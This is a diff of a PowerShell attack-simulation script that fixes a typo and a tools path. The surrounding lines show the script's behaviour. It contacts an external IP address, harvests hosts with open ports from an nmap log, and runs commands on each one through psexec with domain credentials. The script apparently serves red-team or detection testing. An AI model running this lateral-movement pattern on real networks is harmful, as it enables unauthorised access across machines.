@@ -42,12 +42,12 @@ Write-Host "Use Invoke-WebRequest to reach 118.24.150.172"
 Invoke-WebRequest -URI 118.24.150.172 -UseBasicParsing
 
 # Grab available endpoints in network based on nmap scan and do psexec
-Write-Host "Use results of Nmap to leverahe PSExec"
+Write-Host "Use results of Nmap to leverage PSExec"
 $nmaplog = (Get-Content -Path $ThreatBox\logs\nmap.log | Where-Object {$_ -like '*Discovered open port*'})
 $nmaplogip = ($nmaplog  |  Select-String -Pattern "\d{1,3}(\.\d{1,3}){3}" -AllMatches).Matches.Value
 foreach ($nmapip in $nmaplogip) {
 if (test-Connection -Cn $nmapip -quiet) {
-    cd $ThreatBox\tools\pstools
+    cd $ThreatBox\tools\
     psexec \\$nmapip -u $domainUser -p $DomainPass PowerShell ipconfig
 } else {
     "$nmapip is not available"
